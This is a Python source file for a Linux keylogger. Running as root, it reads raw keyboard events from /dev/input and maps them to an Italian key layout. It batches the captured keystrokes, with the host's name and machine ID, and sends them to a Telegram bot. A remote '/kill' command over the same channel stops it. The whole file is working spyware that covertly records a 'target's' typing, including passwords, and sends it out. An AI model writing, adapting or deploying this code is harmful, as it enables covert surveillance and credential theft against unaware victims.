#!/usr/bin/env python3
import os
import socket
import uuid
import struct
import sys
import time
import threading
import subprocess

from telegramUtils import sendFromBuffer
from telegramUtils import syncWithLatestUpdate
from telegramUtils import waitNewMsg

wantSHIFT = 0       #do you want in the logs [SHIFT] when target press shift    (1/0)
debugging = 0       #get extra comments                                         (1/0)
enableLocalKillSwitch = 0                                                   # (1/0)
threshold = 20      #how many keys after sendinf the text to the telegram bot   (int)
pathKiller = "/root/killSwitch.sh"

hostname = socket.gethostname()
machine_id = uuid.getnode()
EVENT_FORMAT = 'llHHI'
EVENT_SIZE   = struct.calcsize(EVENT_FORMAT)
kill_flag = threading.Event()

KEYMAP = {
    1: "<ESC>", 2: '1', 3: '2', 4: '3', 5: '4', 6: '5',
    7: '6', 8: '7', 9: '8', 10: '9', 11: '0',
    12: '\'', 13: 'ì', 14:"<backspace>", 15:'<TAB>', 16: 'q', 17: 'w', 18: 'e',
    19: 'r', 20: 't', 21: 'y', 22: 'u', 23: 'i',
    24: 'o', 25: 'p', 26:'è', 27:'+', 28:"<ENTER>", 29:"<CTRL>", 30: 'a', 31: 's', 32: 'd',
    33: 'f', 34: 'g', 35: 'h', 36: 'j', 37: 'k',
    38: 'l', 39: 'ò', 40: 'à', 40: '\\', 43: 'ù', 44: 'z', 45: 'x', 46: 'c', 47: 'v',
    48: 'b', 49: 'n', 50: 'm',51:',',52:'.', 53:'-', 56:"<ALT>", 100:"<ALT>", 57: ' ', 68: "<LOCK>", 125:"<WIN>",
    79: '<TAST>1', 80: '<TAST>2', 81: '<TAST>3', 75: '<TAST>4', 76: '<TAST>5',
    77: '<TAST>6', 71: '<TAST>7', 72: '<TAST>8', 73: '<TAST>9', 86: '<',
    105: "<leftArr>", 108: "<downArr>", 106: "<rightArr>", 103: "<upArr>", 
    42:'[SHIFT]',54:'[SHIFT]',#SHIFTS I DONT WANT TO REGISTER
}
SHIFT_MAP = {
    '1': '!', '2': '"', '3': '£', '4': '$', '5': '%',
    '6': '&', '7': '/', '8': '(', '9': ')', '0': '=',
    '\'': '?', 'ì': '^', 'è': 'é', '+': '*', '\\': '|',
    ',': ';', '.': ':', '-': '_', '<': '>',
    'ò': 'ç', 'à': '°', 'ù': '§',

    'a': 'A', 'b': 'B', 'c': 'C', 'd': 'D', 'e': 'E',
    'f': 'F', 'g': 'G', 'h': 'H', 'i': 'I', 'j': 'J',
    'k': 'K', 'l': 'L', 'm': 'M', 'n': 'N', 'o': 'O',
    'p': 'P', 'q': 'Q', 'r': 'R', 's': 'S', 't': 'T',
    'u': 'U', 'v': 'V', 'w': 'W', 'x': 'X', 'y': 'Y',
    'z': 'Z', ' ': ' '
}

# UTILS:

def FindKeyboardPath():
    base = '/dev/input/by-path'
    for name in os.listdir(base):
        if name.endswith('-kbd'):
            if debugging:
                print(f"[+] keyboard found: {name}")
            return os.path.join(base, name)
    raise RuntimeError("Device not found in /dev/input/by-path")

def OpenDevice(path):
    return os.open(path, os.O_RDONLY | os.O_NONBLOCK)

def decodeEvent(data):
    return struct.unpack(EVENT_FORMAT, data)

def code2char(code):
    return KEYMAP.get(code, f"<{code}>")

def checkLocalKillSwitch():
    return 1 if os.path.isfile("/tmp/kill") else 0

def saveKey(key):
    global contKeys
    global log_buffer

    log_buffer.append(key)
    contKeys = contKeys + 1

    if contKeys > threshold:
        sendFromBuffer(log_buffer)
        log_buffer = []
        contKeys = 0

# global variables
flagSHIFT = 0
shift_lock = threading.Lock()
log_buffer = []
contKeys = 0

# THREAD SHIFT

def monitorShift(fd_shift):
    global flagSHIFT
    if debugging:
        print("[+] Shift Thread correcly working")
    while True:
        try:
            data = os.read(fd_shift, EVENT_SIZE)
            if len(data) < EVENT_SIZE:
                continue
            _, _, ev_type, code, value = decodeEvent(data)

            if ev_type == 1 and code in (42, 54):  # left/right shift
                with shift_lock:
                    if value == 1 or value == 2:
                        flagSHIFT = 1
                        if debugging and value==1:
                            print("[**] Shift PRESSED")
                    elif value == 0:
                        flagSHIFT = 0
                        if debugging:
                            print("[**] Shift REALESED")

        except BlockingIOError:
            time.sleep(0.005)
        except OSError:
            break

# THREAD READ KEYS

def monitorKeys(fd):
    if debugging:
        print("[+] monitorKeys Thread correcly working")

    while True:
        #KillSwitch conditions checks
        if kill_flag.is_set() or (enableLocalKillSwitch and checkLocalKillSwitch()):
            if debugging:
                print("[-] kill switch matched")
            break

        #getting an event
        try:
            data = os.read(fd, EVENT_SIZE)
        except BlockingIOError:
            time.sleep(0.01)
            continue
        if len(data) < EVENT_SIZE:
            continue
        sec, usec, ev_type, code, value = decodeEvent(data)

        #reading the keyboard event
        if ev_type == 1:
            if value == 1:
                c = code2char(code)
                if c!="[SHIFT]" or wantSHIFT:
                    with shift_lock:
                        if flagSHIFT:
                            c = SHIFT_MAP.get(c, c)
                    if c:
                        if debugging:
                            print(f"[*] Registerd: {c}")
                        saveKey(c)

            if value == 0 and code2char(code)=="[SHIFT]" and wantSHIFT:
                log_buffer.append("[SHIFTUP]")

# THREAD KILL SWITCH

def chechRemoteKillSwitch():
    while not kill_flag.is_set():
        text = waitNewMsg(timeout=5)
        if text and text == f"/kill {machine_id}":
            if debugging:
                print("command /kill got")
            
            log_buffer.append(f"\nEXITING from {machine_id}")
            sendFromBuffer(log_buffer)

            kill_flag.set()
            subprocess.run(["bash", pathKiller])
            return
        else:
            if debugging:
                print("Timeout waitNewMsg: no messagge recived, keep listening")

# MAIN

def main():
    global log_buffer
    
    #check for root
    if os.geteuid() != 0:
        if debugging:
            print("[!]Error: need sudo/root priviledges!", file=sys.stderr)
        sys.exit(1)

    #looking for a keyboard
    try:
        kbd_path = FindKeyboardPath()
    except RuntimeError as e:
        if debugging:
            print(f"[!]Error: {e}", file=sys.stderr)
        sys.exit(1)
    
    #sync telegram bot
    syncWithLatestUpdate()

    # starting messages
    log_buffer.append("CONNECTED\nhostname: " + str(hostname) + ",\nmachine_id: " + str(machine_id) + "\nTEXT:\n")
    sendFromBuffer(log_buffer)
    log_buffer=[]

    fd1 = OpenDevice(kbd_path)
    fd2 = OpenDevice(kbd_path)

    # starting threads
    t_shift = threading.Thread(target=monitorShift, args=(fd1,), daemon=True)
    t_kill = threading.Thread(target=chechRemoteKillSwitch, daemon=True)
    t_shift.start()
    t_kill.start()

    if debugging:
        print(f"[+] listening on {kbd_path}... (press ESC to exit)")
    try:
        monitorKeys(fd2)
    finally:
        os.close(fd1)
        os.close(fd2)

    #closing
    testo = ''.join(log_buffer)
    if debugging:
        print(f"registerd about ({len(log_buffer)}) keys:")
        print(testo)


if __name__ == '__main__':
    main()
